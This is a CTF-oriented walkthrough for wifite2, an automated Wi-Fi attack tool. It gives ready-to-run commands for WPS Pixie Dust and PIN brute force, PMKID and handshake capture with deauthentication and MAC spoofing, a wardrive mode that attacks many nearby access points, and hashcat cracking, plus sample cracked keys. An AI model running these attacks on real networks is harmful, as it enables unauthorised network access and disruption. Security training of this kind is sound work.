# wifite2 — walkthrough

Auto-orchestrator. Enumerate APs → pick one → try WPS Pixie → WPS
PIN brute → PMKID → 4-way + deauth → hashcat. One command line, no
manual pivoting.

Great starting point. Not sufficient for anything past 2020-era
puzzles.

## Preconditions

- wifite2 installed (`apt install wifite` on Kali).
- Monitor+injection adapter.
- rockyou (or any wordlist).

## Path A — Attack everything (interactive)

```
sudo wifite --dict /path/to/rockyou.txt
```

wifite scans, presents the target list, waits for you to select
(all / range / specific).

Per-target sequence:

1. WPS scan (unless `--no-wps`).
2. If WPS: Pixie Dust → PIN brute → PBC.
3. If WPA2: PMKID via hcxdumptool → 4-way + deauth → aircrack-ng
   or hashcat.
4. If WEP: aircrack-ng.

Cracked keys land in `hs/cracked.json` and a per-target
`hs/handshake_*.cap`.

## Path B — Target a specific BSSID

```
sudo wifite --dict rockyou.txt --bssid AA:BB:CC:DD:EE:FF
```

Skips scan/selection; goes straight after that BSSID.

## Path C — Skip WPS, PMKID-first

```
sudo wifite --dict rockyou.txt --no-wps --pmkid
```

Skip the WPS phase and use hcxdumptool for PMKID capture.

## Path D — Configure the cracker

```
sudo wifite --dict rockyou.txt --hashcat --gpu 0
```

Passes cracks to hashcat instead of aircrack-ng. `--gpu 0` = first
GPU.

## Path E — Increase the deauth aggression

```
sudo wifite --dict rockyou.txt --deauths 5 --anon
```

`--deauths 5` = 5 deauths per burst. `--anon` = spoof MAC before
starting.

## Path F — Wardrive mode (many targets)

```
sudo wifite --dict rockyou.txt --wpa --power 40 --num 20
```

`--power 40` = attack only APs with RSSI > -40 dBm. `--num 20` =
first 20 sorted by RSSI.

## Path G — Read the harvest

```
ls hs/
# cracked.json  handshake_CorpWiFi_AA-BB-CC.cap  ...

cat hs/cracked.json
# [
#   {"essid": "CorpWiFi", "bssid": "AA:BB:CC:DD:EE:FF",
#    "key": "sunshine123", "type": "wpa"},
#   ...
# ]
```

The `key` field is the flag surface for classic WPA2-crack CTFs.

## Where wifite2 stops (and P1N3NUT5 keeps going)

- **PMF-required networks.** Deauth silently fails. Neither
  Kr00k, SSID Confusion, MC-MitM, nor natural-reassoc waiting are
  in wifite2's playbook.
- **WPA3-SAE.** Not supported for capture; falls through as
  "no handshake."
- **WPA3 transition mode.** wifite2 doesn't understand the AKM
  mix. May attack the WPA2 side but doesn't call it out.
- **Enterprise (WPA-EAP).** No rogue-RADIUS.
- **SSID Confusion / Framing Frames / MacStealer / Wi-Fi 7 MLO.**
  All out of scope.
- **Default-PSK derivation.** No SSID-regex → derivation pipeline.
- **Hotspot 2.0 / ANQP.** No.

Use wifite2 as the *first* pass. When it says "no handshake" or
"failed", switch to hand-driven paths from the rest of this corpus.

## Failure modes

- **wifite2 hangs on WPS.** Some APs return partial WSC responses
  that Reaver stalls on. `Ctrl-C` twice and add `--no-wps`.
- **`airmon-ng` iface issues.** Kill NetworkManager first.
- **Handshake captured but crack fails.** wifite2 uses
  aircrack-ng by default (CPU-only). Pass `--hashcat`.
- **PMKID never lands.** AP suppresses. Not a wifite2 bug — move
  to 4-way path or transition to hand-driven `pmkid/`.

## Cite

- kimocoder/wifite2 GitHub.
- attacks.json: `pmkid-capture`, `wpa2-4way-capture`,
  `wps-reaver-online`, `wps-pixie-dust`, `wep-*`.
